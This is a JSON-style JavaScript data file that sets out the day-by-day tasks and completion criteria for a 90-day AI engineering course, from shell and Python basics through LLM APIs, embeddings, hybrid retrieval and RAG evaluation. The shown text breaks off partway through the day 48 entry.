/* ---------------------------------------------------------------------------
   course-data.js — the single source of truth for the 90-day (12-week) checklist.

   Both the site (site/index.html) and the markdown plan
   (ai-engineer-90-day-plan.md, via scripts/build_plan.py) read the day
   titles, tasks and "Done when" lines from here. Edit this file, run
   `make plan`, and the two stay in step.

   Everything after the `=` is strict JSON so scripts/build_plan.py can parse
   it without a JavaScript engine — keep it that way.
   --------------------------------------------------------------------------- */

window.COURSE_WEEKS =
[
  {
    "n": 1,
    "title": "Developer Foundations (The Machine Room &amp; The Wire)",
    "range": "Days 1–7",
    "outcome": "I can command the terminal, wield typed Python as a compiler mold, isolate dependencies with uv in milliseconds, and manage Git trees without fear.",
    "days": [
      {
        "d": "1",
        "t": "The terminal machine room: pipes, streams, and PATH mechanics",
        "tasks": [
          "Trace the physical life of a shell command: how the OS searches executable binary paths in <code>$PATH</code> before raising \"command not found\"",
          "Plumb raw byte streams using Unix pipes <code>|</code> and redirection <code>&gt;</code> to route stdout into stdin without touching disk",
          "Inspect megabyte log dumps with <code>cat</code>, <code>grep</code>, <code>head</code>, and <code>tail -f</code> to isolate error patterns in milliseconds",
          "<b>Build:</b> an adversarial shell drill — construct a nested directory tree, locate corrupt log lines with regex grep, and fix a broken binary PATH"
        ],
        "done": "You diagnose and repair a broken environment path or missing binary in under 60 seconds without panic."
      },
      {
        "d": "2",
        "t": "Pragmatic Python: type hints as rigid casting molds",
        "tasks": [
          "Functions, modules, and memory references: why Python objects are heap pointers and how list comprehensions avoid loop overhead",
          "Type hints (<code>int</code>, <code>str</code>, <code>dict[str, Any]</code>, <code>Optional[T]</code>) as rigid stencils that catch malformed model payloads before runtime",
          "Enforce data integrity with <code>dataclasses</code> and Pydantic models: casting raw incoming byte strings into typed memory structures",
          "<b>Build:</b> a typed text analysis module that parses command-line arguments, counts token frequencies, and passes strict mypy checks"
        ],
        "done": "Your module runs with zero mypy/pyright type errors and rejects malformed dictionary shapes on startup."
      },
      {
        "d": "3",
        "t": "Airtight environments: sub-second dependency isolation with uv",
        "tasks": [
          "Virtual environments demystified: how <code>sys.prefix</code> isolates packages and why global pip installs poison machine state",
          "Wield <code>uv</code> for lightning package resolution: 10–100x faster than pip via Rust-powered wheel caching and hardlink sharing",
          "Lock project dependencies deterministically with <code>pyproject.toml</code> and <code>uv.lock</code> to guarantee reproducible builds on any machine",
          "<b>Build:</b> initialize an isolated uv workspace configured with automated formatting and linting via <code>ruff</code>"
        ],
        "done": "You can destroy your virtual environment and rebuild it completely from <code>uv.lock</code> in under 5 seconds."
      },
      {
        "d": "4",
        "t": "Git under the hood: Merkle trees, commits, and merge mechanics",
        "tasks": [
          "Git's physical anatomy: commits as immutable SHA-1 content snapshots, trees as directory listings, and branches as movable pointers",
          "Commit hygiene: atomic changes, descriptive imperative messages, and feature branch workflows",
          "Manufacture a deliberate merge conflict by editing identical lines on two branches, then resolve it cleanly by inspecting raw diff markers",
          "<b>Build:</b> initialize a clean GitHub repository, commit on an isolated feature branch, push upstream, and merge via pull request"
        ],
        "done": "The words \"merge conflict\" produce calm analysis instead of an elevated heart rate."
      },
      {
        "d": "5",
        "t": "Testing calipers: unit tests, edge cases, and pytest harnesses",
        "tasks": [
          "The testing mindset: writing tripwire assertions that scream the microsecond a refactor breaks system behavior",
          "<code>pytest</code> mechanics: test discovery rules, assertion rewriting, and reusable setup fixtures",
          "Parametrized testing across nasty edge boundaries: empty strings, null bytes, unicode emojis, and $2^{31}-1$ integers",
          "<b>Build:</b> author a comprehensive test suite for your Day 2 text analysis module achieving 100% pass rate on edge cases"
        ],
        "done": "Running <code>pytest</code> catches an intentionally injected off-by-one bug and reports the exact failing line."
      },
      {
        "d": "6",
        "t": "Building robust typed CLI tools for terminal automation",
        "tasks": [
          "Parse CLI flags, positional arguments, and subcommands using <code>argparse</code> with automated <code>--help</code> manual generation",
          "Format terminal output: streaming progress indicators, ASCII status tables, and standard POSIX exit codes (0 for success, 1+ for errors)",
          "Defensive I/O: gracefully handle missing file paths, read permission denials, and broken pipe signals (<code>SIGPIPE</code>)",
          "<b>Build:</b> a production CLI tool that analyzes codebase directories, reports lines of code, and outputs structured JSON or text tables"
        ],
        "done": "A peer can invoke your CLI via <code>uv run</code> with <code>--help</code> and receive clear flags, clean output, and proper exit codes."
      },
      {
        "d": "7",
        "t": "Foundation checkpoint: automated CI assembly line and ship",
        "ship": true,
        "tasks": [
          "Package your CLI into a standalone repo with a crisp README explaining installation, usage flags, and benchmarks",
          "Wire an automated GitHub Actions CI pipeline that executes <code>ruff check</code> and <code>pytest</code> on every push",
          "Enforce zero-regression gates: block pull request merges if any unit test fails or code formatting drifts",
          "Rest and consolidate: protect your momentum; the marathon requires deliberate pacing"
        ],
        "done": "Your repository displays a live green CI build badge verifying tests pass cleanly on an automated cloud runner."
      }
    ]
  },
  {
    "n": 2,
    "title": "Asynchronous Python &amp; Web Protocols (The Wire &amp; The Conductor)",
    "range": "Days 8–14",
    "outcome": "I understand raw HTTP bytes, command the async event loop like a master conductor, and build resilient API gateways that never stall under load.",
    "days": [
      {
        "d": "8",
        "t": "HTTP wire anatomy: verbs, headers, status codes, and JSON payloads",
        "tasks": [
          "The physical wire: how ASCII text headers and raw byte bodies travel over TCP sockets on port 80/443",
          "Dissect HTTP methods (GET, POST), headers (<code>Content-Type</code>, <code>Authorization</code>), and status codes (200, 400, 401, 429, 500, 503)",
          "Inspect network packet exchanges using <code>curl -v</code> to watch the TLS handshake, headers, and payload transfer in real time",
          "<b>Build:</b> construct a raw HTTP client using Python's standard <code>urllib.request</code> that parses response headers and extracts JSON bytes"
        ],
        "done": "You can point to raw network bytes and identify where headers end, where the body begins, and what status code returned."
      },
      {
        "d": "9",
        "t": "Secret hygiene: API keys, bearer tokens, and the vault",
        "tasks": [
          "Authentication on the wire: API keys vs OAuth Bearer tokens, and why credentials must live in headers, never URL query strings",
          "Ironclad environment hygiene: <code>.env</code> files, shell exports, and <code>.gitignore</code> rules to prevent credential leaks",
          "Zero-downtime key rotation: how production services accept dual keys during migration windows without dropping requests",
          "<b>Build:</b> a configuration loader using Pydantic Settings that validates required API keys on startup and fails fast with actionable errors"
        ],
        "done": "Your application refuses to boot if an API key is missing and guarantees zero credentials can ever be committed to Git."
      },
      {
        "d": "10",
        "t": "The asynchronous conductor: asyncio and the single-threaded event loop",
        "tasks": [
          "Synchronous blocking vs asynchronous non-blocking: why waiting on network I/O starves single threads",
          "The event loop under the hood: how <code>async</code> and <code>await</code> yield control back to the conductor while sockets wait for bytes",
          "Concurrent request blasting: firing 20 network requests simultaneously using <code>asyncio.gather()</code> with strict timeout bounds",
          "<b>Build:</b> an async web fetcher that downloads 20 endpoints concurrently in 1.8 seconds instead of 25 seconds synchronously"
        ],
        "done": "You can physically explain why async handles 1,000 idle network sockets on a single CPU core without thread context switching."
      },
      {
        "d": "11",
        "t": "API construction: high-throughput services with FastAPI",
        "tasks": [
          "FastAPI architecture: Starlette async core, route handlers, path parameters, and query parameters",
          "Input contracts: validating request bodies against strict Pydantic schemas with automatic 422 Unprocessable Entity responses",
          "Interactive API documentation: inspecting and testing routes via automatic OpenAPI Swagger UI at <code>/docs</code>",
          "<b>Build:</b> a typed REST API service with health probes (<code>/healthz</code>), custom error handlers, and structured JSON output"
        ],
        "done": "Sending a malformed JSON payload to your endpoint returns an immediate 422 error detailing the exact invalid field."
      },
      {
        "d": "12",
        "t": "The resilient client: connection pools and timeouts with HTTPX",
        "tasks": [
          "Modern async HTTP networking: persistent TCP connection pools and HTTP/2 multiplexing with <code>httpx.AsyncClient</code>",
          "Timeout budgets: configuring separate granular limits for DNS resolution, TCP connect (2s), and read response (5s)",
          "Mocking the wire: intercepting external HTTP calls in unit tests with <code>respx</code> to test failure paths without internet access",
          "<b>Build:</b> an async client wrapper that concurrently polls three remote APIs with connection pooling and strict timeouts"
        ],
        "done": "Your client reuses active TCP sockets across requests and aborts immediately when an upstream endpoint exceeds its timeout budget."
      },
      {
        "d": "13",
        "t": "Battle-hardened resilience: exponential backoff, jitter, and circuit breakers",
        "tasks": [
          "Upstream failure modes: distinguishing transient hiccups (429 Rate Limit, 503 Overloaded) from fatal errors (400, 401, 404)",
          "Thundering herds: why naive fixed retries crash recovering servers, and how exponential backoff with full jitter ($t = \\text{rand}(0, 2^n)$) diffuses traffic",
          "Circuit breaker pattern: tripping the circuit to reject downstream calls immediately when an external provider goes dark",
          "<b>Build:</b> an async retry decorator using <code>tenacity</code> configured with exponential backoff, randomized jitter, and retry quotas"
        ],
        "done": "Your client recovers cleanly from simulated 429 rate limit spikes without dropping tasks or hammering the upstream provider."
      },
      {
        "d": "14",
        "t": "Ship: Resilient Asynchronous API Gateway",
        "ship": true,
        "tasks": [
          "Combine FastAPI, <code>httpx.AsyncClient</code>, connection pools, and jittered retries into an asynchronous API gateway",
          "Deploy the service live to Render, Fly.io, or Railway with an automated <code>/healthz</code> probe",
          "Write an automated pytest suite testing successful responses, 429 backoff recovery, and timeout error wrapping"
        ],
        "done": "A peer can curl your live deployed gateway URL and receive a structured JSON response in under 200ms."
      }
    ]
  },
  {
    "n": 3,
    "title": "Model API Fluency &amp; Prompt Engineering (The Dice Roller &amp; The Cash Register)",
    "range": "Days 15–21",
    "outcome": "I understand token economics to the fourth decimal place, manipulate the 100k-sided dice roller with precision, and cache prompt prefixes to cut costs by 80%.",
    "days": [
      {
        "d": "15",
        "t": "Under the hood: logits, sampling parameters, and raw model calls",
        "tasks": [
          "What an LLM physically does: computing probability distributions (logits) over a 100,000-token vocabulary and rolling dice",
          "Sampling controls: temperature (shaking the dice), top_p (nucleus sampling), <code>max_tokens</code> (the guillotine), and stop sequences",
          "Raw SDK calls (OpenAI / Anthropic): system prompts as foundational rules, user queries, and assistant completions",
          "<b>Build:</b> a CLI runner that executes model completions, measures roundtrip latency, and computes token cost to $0.0001 precision"
        ],
        "done": "You can state the exact physical mechanism of temperature=0.0 (greedy argmax) vs temperature=0.8 and calculate cost per run to the cent."
      },
      {
        "d": "16",
        "t": "BPE token mechanics, spelling blind spots, and BudgetGuard",
        "tasks": [
          "Byte-Pair Encoding (BPE) mechanics: how raw UTF-8 text is recursively merged into integer token IDs",
          "Tokenizer blind spots: why models fail at counting letters in \"strawberry\" or reversing strings (they see token chunks, not characters)",
          "Enforce financial safety: integrate <code>BudgetGuard</code> to track cumulative session spend and trip an emergency breaker at $2.00",
          "<b>Build:</b> an adversarial script testing tokenization boundaries (spaces, punctuation, code indentation) and verifying spend limits"
        ],
        "done": "Your script halts instantly with an assertion error the moment cumulative API spend hits your configured $2 budget ceiling."
      },
      {
        "d": "17",
        "t": "Prompt engineering under fire: few-shot stencils and reasoning traces",
        "tasks": [
          "Few-shot prompting: conditioning the model's token distribution by providing 3–5 input-output pairs inside the prompt stencil",
          "Chain-of-thought (CoT) mechanics: why forcing the model to emit intermediate scratchpad tokens on the wire improves reasoning accuracy",
          "Version control for prompts: separating prompt templates into versioned files (<code>.jinja</code> / <code>.py</code>) instead of messy inline f-strings",
          "<b>Build:</b> a versioned prompt evaluation module tested against a 20-sample benchmark to track accuracy shifts"
        ],
        "done": "Modifying a prompt template automatically runs against your 20-sample benchmark and outputs an exact pass/fail delta."
      },
      {
        "d": "18",
        "t": "Context economics: prompt caching and the 128k conveyor belt",
        "lever": true,
        "tasks": [
          "The context conveyor belt: prompt tokens vs completion tokens, and why input tokens are priced 3-4x cheaper than generation tokens",
          "Prompt caching mechanics: how providers freeze static prefix KV-cache states in GPU memory for up to 80-90% cost discounts",
          "Architectural decision: when loading 100k tokens into a cached context window completely eliminates the need for vector RAG",
          "<b>Build:</b> a long-document Q&amp;A script using prompt prefix caching, verifying cache hit telemetry, and logging the cost drop"
        ],
        "done": "Your execution logs prove a prompt cache hit reduced your input token bill by 80%+ and cut TTFT in half."
      },
      {
        "d": "19",
        "t": "Multimodal perception: slicing pixels into token grids",
        "tasks": [
          "How vision models \"see\": splitting high-resolution images into $512 \\times 512$ coordinate tiles and projecting pixel patches into embedding space",
          "Image token economics: calculating the exact token footprint of an image based on resolution, aspect ratio, and tile counts",
          "Passing multimodal payloads: base64 encoding vs public image URLs in structured API message envelopes",
          "<b>Build:</b> an automated extractor that takes scanned receipt images or invoice PDFs and transcribes line items into markdown tables"
        ],
        "done": "Your script feeds a crumpled paper receipt image to a vision model and extracts item names, quantities, and prices with 100% table fidelity."
      },
      {
        "d": "20",
        "t": "Deterministic development: SHA-256 disk caching for prompt evals",
        "tasks": [
          "The cost and latency of prompt iteration: why non-determinism and repeated API hits slow down local development",
          "Implement content-addressed disk caching: compute <code>SHA256(prompt + model + temperature)</code> to store and retrieve responses locally",
          "Wipe and bypass controls: adding <code>--no-cache</code> flags to force live model calls when verifying non-deterministic behavior",
          "<b>Build:</b> integrate disk-backed LLM response caching into your prompt development harness (<code>.cache/llm_eval/</code>)"
        ],
        "done": "Re-running a 25-prompt test suite takes under 0.05 seconds and incurs exactly $0.0000 in API charges."
      },
      {
        "d": "21",
        "t": "Ship: Observable Prompt Engine CLI",
        "ship": true,
        "tasks": [
          "Package your prompt runner, token counter, BudgetGuard fuse, and disk cache into a polished public CLI tool",
          "Document real-world metrics in README: cost per query, p95 latency, cache savings, and token efficiency",
          "Consolidate Week 3 skills: review tokenization, prompt caching, and cost mathematics"
        ],
        "done": "Your CLI is public on GitHub, allowing any user to test prompts with live token counting, cost tracking, and disk caching."
      }
    ]
  },
  {
    "n": 4,
    "title": "Structured Outputs, Streaming &amp; Failure Modes (The Stencil &amp; The Ticker Tape)",
    "range": "Days 22–28",
    "outcome": "I can force probabilistic models into rigid Pydantic JSON schemas with 95%+ reliability, stream tokens in real-time via SSE, and survive provider outages.",
    "days": [
      {
        "d": "22",
        "t": "Constrained decoding: forcing models through JSON stencils",
        "lever": true,
        "tasks": [
          "How constrained decoding works: masking logit probabilities so the model physically cannot emit tokens that violate a JSON Schema",
          "Pydantic contracts: field types, regex constraints, enumerated values, and descriptive docstrings guiding token generation",
          "Stress-testing structured extraction: benchmarking parser reliability against messy, ill-formatted data in <code>datasets/messy_invoices.json</code>",
          "<b>Build:</b> an extractor that digests chaotic unstructured invoices and returns validated Pydantic records with zero schema violations"
        ],
        "done": "At least 95% of 15 chaotic test invoices parse cleanly into validated Pydantic objects on the very first attempt."
      },
      {
        "d": "23",
        "t": "Self-healing loops: schema validation, feedback, and automated repair",
        "tasks": [
          "When constrained decoding isn't enough: catching validation errors (missing keys, out-of-range numbers, failed regex checks)",
          "Self-repair loop mechanics: capturing Pydantic's exact validation error string and feeding it back into the model's scratchpad",
          "Defensive degradation: falling back to partial extractions or flagging ambiguous fields rather than throwing unhandled exceptions",
          "<b>Build:</b> an automated repair machine that intercepts malformed outputs and guides the model to fix its schema within 2 retries"
        ],
        "done": "An intentionally sabotaged JSON response is automatically repaired into a valid schema within two self-healing loops without human intervention."
      },
      {
        "d": "24",
        "t": "Ticker-tape output: real-time streaming with Server-Sent Events",
        "tasks": [
          "The Server-Sent Events (SSE) protocol: unidirectional streaming over HTTP using <code>text/event-stream</code> chunks",
          "SSE vs WebSockets: why SSE is the superior, lightweight choice for one-way LLM token streaming over standard HTTP infrastructure",
          "FastAPI async generator streaming using <code>sse-starlette</code> or native <code>StreamingResponse</code>",
          "Measure telemetry on the wire: track Time-To-First-Token (TTFT) and token generation velocity (tokens per second)",
          "<b>Build:</b> a streaming FastAPI endpoint emitting live word tokens and latency metadata headers"
        ],
        "done": "A curl command streaming your endpoint prints the first token in under 400ms and displays steady token-by-token generation."
      },
      {
        "d": "25",
        "t": "Airbags and fail-safes: model cascading and circuit breakers",
        "tasks": [
          "Catalog production failure modes: provider outages (500/503), token context exhaustion, infinite generation loops, and schema hallucinations",
          "Model cascading: routing queries to a cheap, fast model ($0.0001) first, then escalating to an expensive frontier model only on low confidence",
          "Heuristic fallbacks: serving cached historical responses or degraded deterministic replies when all external providers fail",
          "<b>Build:</b> harden your extraction API against simulated upstream 503 outages, network drops, and malicious oversized inputs"
        ],
        "done": "Every simulated upstream provider crash returns a clean, structured JSON error response instead of an unhandled 500 stack trace."
      },
      {
        "d": "26",
        "t": "Deterministic test harnesses: mocking streaming LLM endpoints",
        "tasks": [
          "Integration testing for AI APIs: writing deterministic pytest suites using <code>httpx.AsyncClient</code> without burning live API tokens",
          "Testing SSE token streams: asserting chunk delimiters, SSE event framing (<code>data: ...\\n\\n</code>), and payload schema integrity",
          "Mocking model providers: using <code>pytest-mock</code> or <code>respx</code> to inject simulated token delays, rate limits, and broken JSON payloads",
          "<b>Build:</b> a test harness verifying health checks, extraction validation, and streaming chunk delivery in under 3 seconds"
        ],
        "done": "All integration tests pass completely offline in under 2 seconds, verifying full API functionality without network access."
      },
      {
        "d": "27",
        "t": "Airtight packaging: multi-stage Docker builds and cloud deployment",
        "tasks": [
          "Multi-stage Docker builds: compile dependencies with <code>uv</code> in a builder stage and copy only the final wheel into a slim 120MB runtime image",
          "Container security: non-root user execution, explicit port bindings, and environment variable secret injection",
          "Deploying the microservice to Fly.io, Render, or Railway with configured health probes (<code>/healthz</code>) and memory limits",
          "<b>Build:</b> containerize your extraction service and deploy it live to the public internet"
        ],
        "done": "Your Docker container deploys cleanly with green health checks and responds to public internet requests."
      },
      {
        "d": "28",
        "t": "Ship #1: Production Extraction &amp; Streaming Microservice",
        "ship": true,
        "tasks": [
          "Publish Project 1 repository with clean structure, comprehensive docstrings, and passing test suites",
          "Author a senior-grade README: architecture diagram, p95 latency benchmarks (&lt;400ms TTFT), cost per request, and API docs",
          "Live validation: verify that an external user can curl your public endpoint and receive streamed structured outputs"
        ],
        "done": "Project 1 is live, public on GitHub, and verified with quantitative benchmarks in the README. Month 1 complete!"
      }
    ]
  },
  {
    "n": 5,
    "title": "Vector Embeddings &amp; Ingestion Pipelines (Compass Arrows &amp; The Paper Shredder)",
    "range": "Days 29–35",
    "outcome": "I can transform raw, messy documents into clean 1,536-dimensional coordinate arrows and build zero-waste incremental ingestion pipelines from scratch.",
    "days": [
      {
        "d": "29",
        "t": "Embeddings from first principles: 1,536-D arrows with NumPy",
        "tasks": [
          "Vectors in hyperspace: how embedding models map semantic concepts to directional arrows in 1,536-dimensional coordinate space",
          "Vector similarity math: computing dot products and cosine similarity $\\cos(\\theta) = \\frac{\\vec{A} \\cdot \\vec{B}}{\\|\\vec{A}\\| \\|\\vec{B}\\|}$ in pure NumPy without external vector libraries",
          "Generate dense embeddings via provider APIs (<code>text-embedding-3-small</code> / <code>text-embedding-3-large</code>) and inspect raw float arrays",
          "<b>Build:</b> a functional vector search engine in ~120 lines of pure Python and NumPy matrix multiplication"
        ],
        "done": "You can write the cosine similarity equation on a whiteboard and explain how matrix dot products calculate similarity across 1,000 vectors in 2ms."
      },
      {
        "d": "30",
        "t": "Embedding geometry and blind spots: when arrows fail",
        "tasks": [
          "The bi-encoder architecture: why query and document are projected independently without cross-attention",
          "Adversarial blind spots: why cosine similarity fails on negation ('hotels NOT in Boston'), exact part numbers, and subtle grammatical flips",
          "Vector normalization: why unit vectors simplify cosine similarity to a blazing-fast single dot product",
          "<b>Build:</b> an adversarial evaluation test finding 5 realistic queries where dense vector search completely fails while keyword search succeeds"
        ],
        "done": "You demonstrate an exact query where semantic vector search retrieves irrelevant junk because it cannot resolve negation or exact IDs."
      },
      {
        "d": "31",
        "t": "Document shredding and AST parsing: PDFs, Markdown, and HTML",
        "tasks": [
          "The ingestion reality: raw documents are filled with garbage markup, headers, footers, and erratic formatting",
          "Parsing complex structures: extracting clean text while preserving markdown headings (<code>#</code>, <code>##</code>), bullet lists, and code blocks",
          "Table preservation: parsing multi-column financial and technical tables into structured markdown without scrambling rows into gibberish",
          "<b>Build:</b> a document ingestion sanitizer that turns chaotic PDFs, HTML pages, and markdown files into pristine semantic text"
        ],
        "done": "Your parser ingests a multi-column PDF table and outputs a clean markdown table where every cell aligns with its original header."
      },
      {
        "d": "32",
        "t": "Chunking strategies: fixed windows vs structural boundaries",
        "tasks": [
          "Fixed-size chunking trade-offs: sliding windows (512 tokens with 64-token overlap) and why they slice sentences in half",
          "Structural chunking: splitting strictly along markdown header boundaries and AST code blocks to preserve complete thoughts",
          "Contextual metadata propagation: prepending document breadcrumbs (<code>Document &gt; Chapter 3 &gt; Section 2:</code>) to every chunk before embedding",
          "<b>Build:</b> a structural chunker that automatically stamps parent section headers onto every generated child chunk"
        ],
        "done": "Every isolated text chunk contains enough prepended header metadata to be 100% understandable without reading the rest of the document."
      },
      {
        "d": "33",
        "t": "Zero-waste indexing: SHA-256 fingerprinting and tombstoning",
        "tasks": [
          "Content-addressed identity: computing SHA-256 hashes of raw chunk text to detect document changes",
          "Incremental ingestion: checking hashes against existing index records to skip re-embedding unmodified files",
          "Vector lifecycle management: tombstoning and deleting orphaned chunks when source documents are edited or deleted",
          "<b>Build:</b> an incremental indexing pipeline that embeds only modified documents on re-runs and deletes stale vectors"
        ],
        "done": "Re-running your ingestion pipeline on an unchanged 1,000-page document corpus takes 1.2 seconds and costs exactly $0.0000."
      },
      {
        "d": "34",
        "t": "Contextual retrieval vs long-context caching showdown",
        "lever": true,
        "tasks": [
          "Anthropic's contextual retrieval pattern: generating a 50-token situational summary for every chunk prior to vector embedding",
          "The architectural showdown: when to use prompt caching (stuffing 100k tokens into context) vs vector chunking (RAG)",
          "Latency and cost math: comparing a $0.0004 vector search against a $0.0015 cached prompt across query volume",
          "<b>Build:</b> run a head-to-head benchmark comparing 100k cached prompt retrieval vs chunked vector RAG on accuracy, cost, and latency"
        ],
        "done": "You can articulate with exact dollar and millisecond figures the precise threshold where prompt caching beats vector RAG."
      },
      {
        "d": "35",
        "t": "Ingestion pipeline audit: throughput, cost, and distribution",
        "tasks": [
          "Benchmark ingestion throughput: measure chunks processed per second and embedding spend per megabyte of source text",
          "Audit chunk distributions: plot histograms of token lengths and assert zero empty chunks or truncated code blocks",
          "Document ingestion architecture, rate-limit backoff rules, and failure recovery procedures in a technical spec"
        ],
        "done": "Your ingestion pipeline processes an entire technical documentation corpus, producing zero empty chunks and full cost logs."
      }
    ]
  },
  {
    "n": 6,
    "title": "Production Retrieval &amp; Search Architecture (The Dual-Track Radar &amp; The Detective)",
    "range": "Days 36–42",
    "outcome": "I can build hybrid search pipelines combining dense vector arrows with BM25 keyword radar, fused via RRF and sharpened by cross-encoder rerankers.",
    "days": [
      {
        "d": "36",
        "t": "Production vector stores: HNSW graphs in pgvector and Qdrant",
        "tasks": [
          "Graduating from NumPy arrays: why production requires specialized vector databases for billion-vector scale",
          "Approximate Nearest Neighbor (ANN) index mechanics: Hierarchical Navigable Small World (HNSW) multi-layer graphs vs IVFFlat Voronoi clusters",
          "Configuring pgvector or Qdrant: indexing distance metrics (cosine, inner product), <code>m</code> graph connections, and <code>ef_search</code> accuracy",
          "<b>Build:</b> index your parsed document corpus into pgvector or Qdrant with HNSW indexing and payload metadata"
        ],
        "done": "Your vector database executes sub-15ms approximate nearest neighbor queries over your entire document corpus."
      },
      {
        "d": "37",
        "t": "The keyword radar: exact term retrieval with BM25",
        "tasks": [
          "Why dense vectors fail on exact matches: the physical need for sparse lexical keyword search",
          "The BM25 formula under the hood: Term Frequency (TF), Inverse Document Frequency (IDF), and document length normalization ($b$ and $k_1$)",
          "Setting up an in-memory or database-backed BM25 sparse index alongside your vector database",
          "<b>Build:</b> run BM25 queries against your corpus and demonstrate how it captures exact error codes (<code>ERR-4019</code>) that vector search completely misses"
        ],
        "done": "A query for an exact technical identifier returns rank 1 in your BM25 search lane while ranking below position 50 in pure vector search."
      },
      {
        "d": "38",
        "t": "Hybrid search: fusing radars with Reciprocal Rank Fusion (RRF)",
        "lever": true,
        "tasks": [
          "Why adding raw vector cosine scores to raw BM25 scores fails (comparing non-calibrated scales)",
          "Reciprocal Rank Fusion (RRF) mechanics: combining ranking positions via $\\text{RRF\\_Score} = \\sum \\frac{1}{k + \\text{rank}}$ with constant $k=60$",
          "Tuning lane weights: balancing semantic intent with exact keyword matches across different user query types",
          "<b>Build:</b> implement an RRF merger that combines the top 25 results from BM25 and vector search into a unified top-20 candidate pool"
        ],
        "done": "Your hybrid search successfully answers both conceptual questions and exact identifier queries in the top 3 results."
      },
      {
        "d": "39",
        "t": "The forensic detective: cross-encoder reranking",
        "tasks": [
          "Bi-encoders vs cross-encoders: why joint self-attention across <code>[Query, Document]</code> token pairs blows bi-encoder similarity away",
          "The latency budget trade-off: spending ~40ms to run a cross-encoder (Cohere Rerank or local BGE-Reranker) on the top 20 candidate chunks",
          "Filtering the noise: discarding low-scoring reranked chunks to prevent polluting the LLM context window",
          "<b>Build:</b> add a cross-encoder reranking stage on top of your RRF hybrid candidate pool"
        ],
        "done": "Telemetry logs prove the top-ranked chunk after reranking is objectively more relevant than the top chunk before reranking."
      },
      {
        "d": "40",
        "t": "Query expansion: HyDE and multi-angle search",
        "tasks": [
          "Conversational query rewriting: resolving vague pronouns and follow-up context ('What was its revenue that year?')",
          "Hypothetical Document Embeddings (HyDE): prompting an LLM to generate a speculative answer, then embedding that fantasy answer to find real matches",
          "Multi-query expansion: generating 3 distinct search formulations of a user question and unioning candidate sets",
          "<b>Build:</b> a query transformation pre-processor that expands ambiguous user prompts before hitting the search index"
        ],
        "done": "A vague 3-word question is rewritten into a high-signal search query that successfully surfaces the exact target document."
      },
      {
        "d": "41",
        "t": "Multi-tenant iron fences: pre-filtering vector search",
        "tasks": [
          "Data leakage risks: why post-filtering search results by permissions violates privacy and destroys retrieval recall",
          "Metadata pre-filtering: enforcing hard index partition masks (<code>tenant_id == 'org_99'</code>, <code>permissions IN [...]</code>) during HNSW graph traversal",
          "Index performance under tenant isolation: balancing shared multi-tenant tables vs dedicated tenant indexes",
          "<b>Build:</b> write automated security tests proving User A cannot retrieve documents owned by User B under any adversarial query"
        ],
        "done": "Adversarial tests confirm two users with different security clearances receive completely isolated search results with zero data leakage."
      },
      {
        "d": "42",
        "t": "The Millisecond Waterfall: retrieval latency budgeting",
        "tasks": [
          "Construct the retrieval latency waterfall: Query Embed (45ms) + Hybrid Search (15ms) + RRF Merge (2ms) + Cross-Encoder Rerank (40ms)",
          "Profile and eliminate pipeline bottlenecks: connection pooling, async query dispatch, and reranker batching",
          "Document the retrieval architecture, index configuration, and latency SLA guarantees"
        ],
        "done": "Your end-to-end retrieval p95 latency stays strictly within an 120ms budget across 50 concurrent test queries."
      }
    ]
  },
  {
    "n": 7,
    "title": "Rigorous Retrieval &amp; Generation Evaluation (The Iron Caliper &amp; The Lie Detector)",
    "range": "Days 43–49",
    "outcome": "I can quantitatively prove my RAG pipeline improves using Recall@k, MRR, and Faithfulness judges wired into automated CI regression gates.",
    "days": [
      {
        "d": "43",
        "t": "The ground truth: hand-crafting the 40-question golden set",
        "lever": true,
        "tasks": [
          "Why synthetic LLM-generated evals mislead: the irreplaceable gold standard of 40 hand-verified evaluation cases",
          "Anatomy of an evaluation fixture: user query, ground-truth chunk IDs, canonical reference answer, and query category",
          "Using <code>datasets/golden_rag_eval.json</code> as a template to build a domain-specific evaluation dataset for your corpus",
          "<b>Build:</b> curate and commit a 40-question golden evaluation dataset with verified ground-truth chunk citations"
        ],
        "done": "You have a committed, validated JSON golden dataset containing 40 real questions with exact ground-truth chunk ID mappings."
      },
      {
        "d": "44",
        "t": "Retrieval scorecards: Recall@k and Mean Reciprocal Rank (MRR)",
        "tasks": [
          "Recall@k mathematically: the percentage of evaluation queries where the ground-truth chunk appeared in the top $k$ results",
          "Mean Reciprocal Rank (MRR): measuring rank position quality ($\\frac{1}{\\text{rank}}$) to reward placing the right chunk at position 1",
          "Benchmarking configurations: comparing baseline pure vector vs BM25 vs hybrid RRF vs cross-encoder reranked search",
          "<b>Build:</b> an automated evaluation script that calculates Recall@1, Recall@5, and MRR across your golden set"
        ],
        "done": "You have an objective scorecard proving your hybrid + rerank pipeline beats pure vector search by at least +20% on Recall@5."
      },
      {
        "d": "45",
        "t": "Generation lie detectors: Faithfulness and Answer Relevance",
        "tasks": [
          "Evaluating generative answers: using an LLM-as-a-Judge with strict structured scoring rubrics instead of human vibes",
          "Faithfulness / Groundedness: decomposing answers into atomic statements and verifying that every single claim is backed by retrieved context",
          "Answer Relevance: detecting evasive answers, hallucinated extrapolations, or refusal failures",
          "<b>Build:</b> an evaluation judge that inspects answer-context pairs and outputs a faithfulness score (0.0 to 1.0) with reasoning traces"
        ],
        "done": "Your evaluation judge flags an intentionally hallucinated answer with a Faithfulness score of 0.0 and cites the unsupported sentence."
      },
      {
        "d": "46",
        "t": "The evaluation engine: building the automated test runner",
        "tasks": [
          "Evaluation runner architecture: Golden Dataset -&gt; Pipeline Runner -&gt; Metric Judge -&gt; Aggregator -&gt; Scorecard",
          "Async batch execution: evaluating 40 questions concurrently with semaphore concurrency limits to avoid provider rate limits",
          "Telemetry artifact generation: outputting formatted markdown comparison tables and committing JSON evaluation runs to git",
          "<b>Build:</b> author a standalone CLI command <code>python3 eval.py</code> that executes the full benchmark and displays a summary scorecard"
        ],
        "done": "Executing <code>python3 eval.py</code> runs all 40 test cases across retrieval and generation, printing a clean metrics scorecard in under 30 seconds."
      },
      {
        "d": "47",
        "t": "Verifiable citations: anchoring claims to source chunk IDs",
        "tasks": [
          "Prompting for precision: instructing models to attach strict inline source citations (<code>[Chunk 12]</code>) to every factual claim",
          "Citation verification engine: writing an automated post-processor that verifies cited chunk IDs actually exist in the retrieved context",
          "Refusal calibration: conditioning the model to emit \"I do not have enough verified context to answer\" when retrieval confidence is low",
          "<b>Build:</b> a generation pipeline that returns responses with clickable, verified source chunk citations"
        ],
        "done": "Every claim in the generated answer links to an existing retrieved chunk, and zero unsupported claims slip through."
      },
      {
        "d": "48",
        "t": "CI regression tripwires: breaking builds on quality drops",
        "tasks": [
